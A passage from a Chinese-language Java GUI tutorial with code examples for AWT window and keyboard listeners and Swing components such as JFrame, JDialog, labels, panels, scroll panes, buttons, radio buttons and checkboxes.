class="params">()</span>&#123;</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>));</span><br><span class="line">        <span class="comment">// 匿名内部类，推荐使用</span></span><br><span class="line">        addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="comment">// 最常用的两种方法</span></span><br><span class="line">            <span class="comment">// 窗口关闭</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 窗口激活</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowActivated</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;windowActivated&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221112202648285.png" alt="image-20221112202648285"></p>
<h3 id="2-9、键盘监听">1.3.9. 2.9、键盘监听</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">KeyFrame</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyFrame</span> <span class="keyword">extends</span> <span class="title class_">Frame</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">KeyFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;键盘监听&quot;</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        addKeyListener(<span class="keyword">new</span> <span class="title class_">KeyAdapter</span>() &#123;</span><br><span class="line">            <span class="comment">// 键盘按下</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyPressed</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">                <span class="comment">// 键盘按下的键是哪个,e.getKeyCode()获取键盘的ASCII码值</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">keyCode</span> <span class="operator">=</span> e.getKeyCode();</span><br><span class="line">                <span class="keyword">if</span> (keyCode == <span class="number">65</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;你按下的是a&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((keyCode == <span class="number">66</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;你按下的是b&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyCode == KeyEvent.VK_UP) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;你按下的是上键&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221112203930654.png" alt="image-20221112203930654"></p>
<h2 id="3、Swing">1.4. 3、Swing</h2><h3 id="3-1、窗口、面板、标签">1.4.1. 3.1、窗口、面板、标签</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JFrameDemo</span> &#123;</span><br><span class="line">    <span class="comment">// init(); 初始化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>(<span class="string">&quot;这是一个JFrame窗口&quot;</span>);</span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        frame.setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        <span class="comment">// 获得一个容器，容器中的颜色才是窗口的颜色</span></span><br><span class="line">        frame.getContentPane().setBackground(Color.CYAN);</span><br><span class="line">        <span class="comment">// 设置文字JLable = Lable</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;this is label&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置标签文本居中</span></span><br><span class="line">        jLabel.setHorizontalAlignment(SwingConstants.CENTER);</span><br><span class="line">        frame.add(jLabel);</span><br><span class="line">        <span class="comment">// 关闭事件,不加默认点关闭是隐藏窗口，程序没有退出</span></span><br><span class="line">        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 建立一个窗口</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JFrameDemo</span>().init();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221112205459565.png" alt="image-20221112205459565"></p>
<h3 id="3-2、JDialog弹窗模拟">1.4.2. 3.2、JDialog弹窗模拟</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DialogDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyDialogFrame</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDialogFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="comment">// 主窗口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyDialogFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;MyDialogFrame&quot;</span>);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        <span class="comment">// 关闭事件</span></span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">// 获得容器</span></span><br><span class="line">        <span class="type">Container</span> <span class="variable">contentPane</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        contentPane.setBackground(Color.GRAY);</span><br><span class="line">        <span class="comment">// 设置绝对布局</span></span><br><span class="line">        setLayout(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 按钮</span></span><br><span class="line">        <span class="type">JButton</span> <span class="variable">jButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;点击弹窗&quot;</span>);</span><br><span class="line">        jButton.setBounds(<span class="number">30</span>,<span class="number">30</span>,<span class="number">200</span>,<span class="number">50</span>);</span><br><span class="line">        <span class="comment">// 添加点击弹窗事件,此处可以用lambda表达式，点击new ActionListener() alt+enter自动生成</span></span><br><span class="line">        jButton.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MyDialog</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        contentPane.add(jButton);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDialog</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyDialog</span><span class="params">()</span>&#123;</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//setLayout(null);</span></span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Container</span>();</span><br><span class="line">        <span class="comment">// 弹窗中默认自动关闭选项，无需再增加关闭事件</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;this is test&quot;</span>);</span><br><span class="line">        <span class="comment">// 不加大小的话无法看见,绝对布局也要注释掉</span></span><br><span class="line">        label1.setBounds(<span class="number">30</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">        container.add(label1);</span><br><span class="line">        add(container);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113104924611.png" alt="image-20221113104924611"></p>
<h3 id="3-3、标签">1.4.3. 3.3、标签</h3><ul>
<li>JLabel</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new JLable(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>绘制Label</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IconDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">Icon</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> width;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> height;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IconDemo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IconDemo</span><span class="params">(<span class="type">int</span> width,<span class="type">int</span> height)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        <span class="type">IconDemo</span> <span class="variable">iconDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IconDemo</span>(<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;icontest&quot;</span>,iconDemo,SwingConstants.CENTER);</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        container.add(label);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">IconDemo</span>().init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">paintIcon</span><span class="params">(Component c, Graphics g, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        g.drawOval(x,y,width,height);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getIconWidth</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.width;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getIconHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113111612958.png" alt="image-20221113111612958"></p>
<ul>
<li>图片Label</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IconDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IconDemo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;ImageIcon&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取当前类路径下的文件资源</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> IconDemo.class.getResource(<span class="string">&quot;1.png&quot;</span>);</span><br><span class="line">        <span class="type">ImageIcon</span> <span class="variable">imageIcon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageIcon</span>(url);</span><br><span class="line">        label.setIcon(imageIcon);</span><br><span class="line">        label.setHorizontalAlignment(SwingConstants.CENTER);</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        container.add(label);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">IconDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113114811430.png" alt="image-20221113114811430"></p>
<h3 id="3-4、面板">1.4.4. 3.4、面板</h3><ul>
<li>JPanel</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JPanelDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JPanelDemo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        container.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">10</span>));</span><br><span class="line">        <span class="type">JPanel</span> <span class="variable">jPanel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">1</span>,<span class="number">3</span>));</span><br><span class="line">        jPanel.add(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        jPanel.add(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;2&quot;</span>));</span><br><span class="line">        jPanel.add(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;3&quot;</span>));</span><br><span class="line">        container.add(jPanel);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JPanelDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>JScrollPane</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JScrollDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JScrollDemo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 文本域</span></span><br><span class="line">        <span class="type">JTextArea</span> <span class="variable">jTextArea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTextArea</span>(<span class="number">20</span>,<span class="number">50</span>);</span><br><span class="line">        jTextArea.setText(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">        <span class="comment">// Scroll面板</span></span><br><span class="line">        <span class="type">JScrollPane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(jTextArea);</span><br><span class="line">        container.add(pane);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JScrollDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113120712080.png" alt="image-20221113120712080"></p>
<h3 id="3-5、按钮">1.4.5. 3.5、按钮</h3><ul>
<li>图片按钮</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JButtonmDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JButtonmDemo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 将一个图片变为图标</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> JButtonmDemo.class.getResource(<span class="string">&quot;1.png&quot;</span>);</span><br><span class="line">        <span class="type">ImageIcon</span> <span class="variable">imageIcon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageIcon</span>(url);</span><br><span class="line">        <span class="comment">// 把这个图标放在按钮上</span></span><br><span class="line">        <span class="type">JButton</span> <span class="variable">jButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>();</span><br><span class="line">        jButton.setIcon(imageIcon);</span><br><span class="line">        <span class="comment">// 设置鼠标放上去的提示信息</span></span><br><span class="line">        jButton.setToolTipText(<span class="string">&quot;图片按钮&quot;</span>);</span><br><span class="line">        container.add(jButton);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JButtonmDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113130440668.png" alt="image-20221113130440668"></p>
<ul>
<li>单选框</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JButtonmDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JButtonmDemo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 单选按钮</span></span><br><span class="line">        <span class="type">JRadioButton</span> <span class="variable">radioButton1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRadioButton</span>(<span class="string">&quot;radioButton1&quot;</span>);</span><br><span class="line">        <span class="type">JRadioButton</span> <span class="variable">radioButton2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRadioButton</span>(<span class="string">&quot;radioButton2&quot;</span>);</span><br><span class="line">        <span class="type">JRadioButton</span> <span class="variable">radioButton3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRadioButton</span>(<span class="string">&quot;radioButton3&quot;</span>);</span><br><span class="line">        <span class="comment">// 由于单选按钮只能选一个，所以需要对单选按钮进行分组。每个组里的单选按钮只能选一个，不影响其他组的选择</span></span><br><span class="line">        <span class="type">ButtonGroup</span> <span class="variable">buttonGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ButtonGroup</span>();</span><br><span class="line">        buttonGroup.add(radioButton1);</span><br><span class="line">        buttonGroup.add(radioButton2);</span><br><span class="line">        buttonGroup.add(radioButton3);</span><br><span class="line">        container.add(radioButton1,BorderLayout.WEST);</span><br><span class="line">        container.add(radioButton2,BorderLayout.CENTER);</span><br><span class="line">        container.add(radioButton3,BorderLayout.EAST);</span><br><span class="line"></span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JButtonmDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113131851236.png" alt="image-20221113131851236"></p>
<ul>
<li>多选框</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.SwingDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JButtonmDemo</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JButtonmDemo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> getContentPane();</span><br><span class="line">        <span class="comment">// 多选按钮</span></span><br><span class="line">        <span class="type">JCheckBox</span> <span class="variable">checkBox01</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JCheckBox</span>(<span class="string">&quot;checkBox01&quot;</span>);</span><br><span class="line">        <span class="type">JCheckBox</span> <span class="variable">checkBox02</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JCheckBox</span>(<span class="string">&quot;checkBox02&quot;</span>);</span><br><span class="line">        <span class="type">JCheckBox</span> <span class="variable">checkBox03</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JCheckBox</span>(<span class="string">&quot;checkBox03&quot;</span>);</span><br><span class="line">        container.add(checkBox01,BorderLayout.EAST);</span><br><span class="line">        container.add(checkBox02,BorderLayout.CENTER);</span><br><span class="line">        container.add(checkBox03,BorderLayout.WEST);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JButtonmDemo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113132404457.png" alt="image-20221113132404457"></p>
<h3 id="3-6、列表">1.4.6. 3.6、列表</h3><ul>
<li>下拉框</li>
</ul>
